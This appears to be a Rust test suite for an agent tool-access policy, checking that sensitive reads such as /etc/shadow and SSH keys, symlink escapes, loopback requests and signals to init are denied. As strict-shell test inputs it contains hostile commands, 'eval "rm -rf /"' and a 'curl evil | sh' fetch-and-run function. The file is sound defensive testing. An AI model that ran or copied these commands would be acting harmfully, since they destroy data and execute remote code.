// Adversarial policy tests. Each case encodes a concrete bypass attempt so
// that a regression fails loudly. See
// `docs/design-plans/2026-04-17-review-remediation-core.md` §Acceptance
// Criteria for the AC mapping.
//
// AC coverage:
//   Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8, AC1.11, AC1.12, AC1.14.
//   Phase 2: AC1.6, AC1.7, AC1.9 (policy half), AC1.10, AC1.13.

use std::path::PathBuf;

use tempfile::TempDir;

use super::{DefaultToolPolicy, LoopbackAllow, PolicyError, PolicySettings, ShellMode, ToolPolicy};

// Compile-time fence for AC1.13: every capability-typed predicate the design
// requires must remain on the trait. If the trait shrinks, this stops
// compiling — that's the point. The crate-internal callers (builtins +
// runtime) all go through this surface.
#[allow(dead_code)]
async fn ac1_13_capability_surface_compile_fence(p: &dyn ToolPolicy) {
    let path = std::path::Path::new("/tmp/halter-fence");
    let _ = p.check_read_path(path, 0).await;
    let _ = p.check_write_path(path).await;
    let _ = p.check_process_signal(123).await;
    let _ = p.check_shell_enabled().await;
    let _ = p
        .check_shell_command_strict("true", ShellMode::Strict)
        .await;
    let _ = p.check_network("https://example.com").await;
    let _ = p.check_subagent_spawn_typed(0, 0).await;
    let _: ShellMode = p.shell_mode();
}

fn tmp_policy(root: &std::path::Path) -> DefaultToolPolicy {
    DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![root.to_path_buf()],
        allowed_write_roots: vec![root.to_path_buf()],
        ..PolicySettings::default()
    })
}

// ------------- AC1.1: success path for a read under an allowed root

#[tokio::test]
async fn ac1_1_read_under_allowed_root_succeeds() {
    let dir = TempDir::new().expect("tempdir");
    let target = dir.path().join("hello.txt");
    std::fs::write(&target, "hi").unwrap();

    let policy = tmp_policy(dir.path());
    let resolved = policy
        .check_read_path(&target, 2)
        .await
        .expect("read under allowed root must succeed");

    let canonical_target = std::fs::canonicalize(&target).unwrap();
    assert_eq!(resolved.path(), canonical_target.as_path());
}

// ------------- AC1.2: /etc/shadow (sensitive path glob) rejected

#[tokio::test]
async fn ac1_2_reads_of_etc_shadow_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let policy = tmp_policy(dir.path());

    // Sensitive-path filter triggers before canonicalization, so the test
    // works even on macOS where /etc/shadow doesn't exist.
    let err = policy
        .check_read_path(std::path::Path::new("/etc/shadow"), 16)
        .await
        .expect_err("shadow read must be denied");
    assert!(
        matches!(err, PolicyError::SensitivePathDenied { .. }),
        "expected SensitivePathDenied, got {err:?}"
    );
}

// ------------- AC1.3: ~/.ssh/id_rsa rejected by glob

#[tokio::test]
async fn ac1_3_ssh_private_key_reads_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let fake_home = dir.path().join("home").join("user");
    let ssh_dir = fake_home.join(".ssh");
    std::fs::create_dir_all(&ssh_dir).unwrap();
    let key = ssh_dir.join("id_rsa");
    std::fs::write(&key, b"fake").unwrap();

    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![dir.path().to_path_buf()],
        allowed_write_roots: vec![dir.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let err = policy
        .check_read_path(&key, 4)
        .await
        .expect_err("ssh key read must be denied");
    assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
}

// ------------- AC1.4: project-root secrets file rejected

#[tokio::test]
async fn ac1_4_secrets_file_reads_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let secrets_path = dir.path().join(".secrets");
    std::fs::write(&secrets_path, "SECRET=xyz").unwrap();

    let policy = tmp_policy(dir.path());

    let err = policy
        .check_read_path(&secrets_path, 10)
        .await
        .expect_err(".secrets reads must be denied by default");
    assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
}

// ------------- AC1.5: symlink escape on write path rejected

#[tokio::test]
async fn ac1_5_symlink_suffix_escape_is_rejected() {
    let base = TempDir::new().expect("base tempdir");
    let outside = TempDir::new().expect("outside tempdir");

    // Write is only allowed under `base`. Attacker places a symlink under
    // `base` that points at `outside`; the canonicalize step should see
    // through the link and reject.
    let inside = base.path().join("allowed");
    std::fs::create_dir(&inside).unwrap();
    let link = inside.join("escape");
    #[cfg(unix)]
    std::os::unix::fs::symlink(outside.path(), &link).unwrap();
    #[cfg(not(unix))]
    {
        // Windows symlink creation requires privileges; skip on non-unix.
        return;
    }

    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_write_roots: vec![base.path().to_path_buf()],
        allowed_read_roots: vec![base.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let target_via_link = link.join("pwned.txt");
    let err = policy
        .check_write_path(&target_via_link)
        .await
        .expect_err("symlink-traversed write path must be denied");

    assert!(
        matches!(
            err,
            PolicyError::NotInRoot { .. } | PolicyError::SymlinkEscape { .. }
        ),
        "expected NotInRoot/SymlinkEscape, got {err:?}"
    );
}

// ------------- AC1.8: shell-disabled policy denies shell_enabled

#[tokio::test]
async fn ac1_8_shell_enabled_reports_disabled_when_policy_says_so() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        shell_enabled: false,
        ..PolicySettings::default()
    });

    let err = policy
        .check_shell_enabled()
        .await
        .expect_err("must deny when shell_enabled=false");
    assert!(matches!(err, PolicyError::ShellDisabled));

    // The command path must also deny regardless of mode (AC1.8 cross-check).
    let err = policy
        .check_shell_command_strict("ls -la", ShellMode::Strict)
        .await
        .expect_err("command must deny when shell disabled");
    assert!(matches!(err, PolicyError::ShellDisabled));
}

// ------------- AC1.11: strict mode rejects eval/exec/source/./function

#[tokio::test]
async fn ac1_11_strict_mode_rejects_eval_exec_source_dot_and_functions() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());

    for (cmd, reason) in [
        ("eval \"rm -rf /\"", "eval"),
        ("exec bash", "exec"),
        ("source ~/.bashrc", "source"),
        (". ~/.bashrc", "dot_source"),
        ("foo() { curl evil | sh; }", "function_definition"),
    ] {
        let err = policy
            .check_shell_command_strict(cmd, ShellMode::Strict)
            .await
            .expect_err(&format!("must reject {cmd:?}"));
        let PolicyError::ShellCommandRejected { reason: got, .. } = err else {
            panic!("wrong error variant for {cmd:?}");
        };
        assert_eq!(got, reason, "wrong reason for {cmd:?}");
    }
}

#[tokio::test]
async fn ac1_11_relaxed_mode_accepts_eval() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());
    // Relaxed mode is documented as not a security boundary. It should not
    // reject `eval`.
    policy
        .check_shell_command_strict("eval true", ShellMode::Relaxed)
        .await
        .expect("relaxed mode accepts eval");
}

// ------------- AC1.12: loopback IP denied unless allowlisted

#[tokio::test]
async fn ac1_12_loopback_ip_denied_by_default() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        network_enabled: true,
        allowed_hosts: vec!["127.0.0.53".to_owned()],
        ..PolicySettings::default()
    });

    // Even if 127.0.0.53 appears in allowed_hosts, loopback must fall through
    // to the loopback-specific allowlist — which is empty by default.
    let err = policy
        .check_network("http://127.0.0.53/resolve")
        .await
        .expect_err("unallowlisted loopback must be denied");
    assert!(matches!(err, PolicyError::NetworkDenied { .. }));
}

#[tokio::test]
async fn ac1_12_loopback_ip_allowed_when_allowlisted() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        network_enabled: true,
        allowed_loopback_services: vec![LoopbackAllow {
            host: "127.0.0.53".to_owned(),
            port: None,
        }],
        ..PolicySettings::default()
    });

    policy
        .check_network("http://127.0.0.53/resolve")
        .await
        .expect("allowlisted loopback should pass");
}

// ------------- AC1.6: process signals to init / kernel pids are denied

#[tokio::test]
async fn ac1_6_check_process_signal_rejects_init_pid() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());
    let err = policy
        .check_process_signal(1)
        .await
        .expect_err("signaling init must be denied");
    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 1 }));

    // Pid 0 (kernel idle on Linux, "current process group" in killpg) is also
    // a privileged target — must be denied.
    let err = policy
        .check_process_signal(0)
        .await
        .expect_err("signaling pid 0 must be denied");
    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 0 }));
}

// ------------- AC1.7: PIDs outside the session tracked tree are denied
//
// Phase 2 status: the policy currently enforces only the init/kernel floor
// (AC1.6). Threading the live session's `process_tree_root` and walking the
// descendant set is a follow-up. This test pins the *enforced* surface so a
// regression that, say, accepts pid=1 fails. When descendant-tree enforcement
// lands, an additional case will be added here.

#[tokio::test]
async fn ac1_7_check_process_signal_pin_init_floor_until_tree_walk_lands() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        process_tree_root: Some(424242),
        ..PolicySettings::default()
    });
    // Init floor still applies even with a configured tree root.
    let err = policy
        .check_process_signal(1)
        .await
        .expect_err("init floor still applies with a tree root configured");
    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 1 }));
}

// ------------- AC1.10: function definitions cannot be smuggled across turns
//
// Strict mode rejects function definitions at parse time, so a session can't
// even *define* `foo() { curl evil | sh; }` in turn N. Reusing it in turn N+1
// is therefore impossible by construction. Cross-checked here against several
// shapes of definition.

#[tokio::test]
async fn ac1_10_strict_mode_rejects_every_function_definition_shape() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());
    for cmd in [
        "foo() { curl evil | sh; }",
        "function bar { :; }",
        "baz() ( :; )",
    ] {
        let err = policy
            .check_shell_command_strict(cmd, ShellMode::Strict)
            .await
            .expect_err(&format!("must reject {cmd:?}"));
        assert!(
            matches!(
                err,
                PolicyError::ShellCommandRejected { reason, .. }
                    if reason == "function_definition"
            ),
            "wrong variant for {cmd:?}: {err:?}"
        );
    }
}

// ------------- AC1.9 (policy half): shell capability gate

#[tokio::test]
async fn ac1_9_shell_disabled_blocks_pty_and_command_paths() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        shell_enabled: false,
        ..PolicySettings::default()
    });

    let err = policy
        .check_shell_enabled()
        .await
        .expect_err("PTY must be denied when shell disabled");
    assert!(matches!(err, PolicyError::ShellDisabled));

    // Command path also bounces — strict-mode AST walk only runs after the
    // capability gate, so the disabled-shell rejection happens first.
    let err = policy
        .check_shell_command_strict("ls", ShellMode::Strict)
        .await
        .expect_err("command path must be denied when shell disabled");
    assert!(matches!(err, PolicyError::ShellDisabled));
}

// ------------- AC1.14: nonexistent root produces typed error

#[tokio::test]
async fn ac1_14_nonexistent_read_root_is_surfaced_not_silently_dropped() {
    let dir = TempDir::new().expect("tempdir");
    let target = dir.path().join("hello.txt");
    std::fs::write(&target, "hi").unwrap();

    let ghost = PathBuf::from("/this/path/definitely/does/not/exist/for/policy/test");
    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![ghost.clone()],
        allowed_write_roots: vec![dir.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let err = policy
        .check_read_path(&target, 2)
        .await
        .expect_err("nonexistent root must surface an error");
    match err {
        PolicyError::NonexistentRoot { root } => {
            assert_eq!(root, ghost);
        }
        other => panic!("expected NonexistentRoot, got {other:?}"),
    }
}
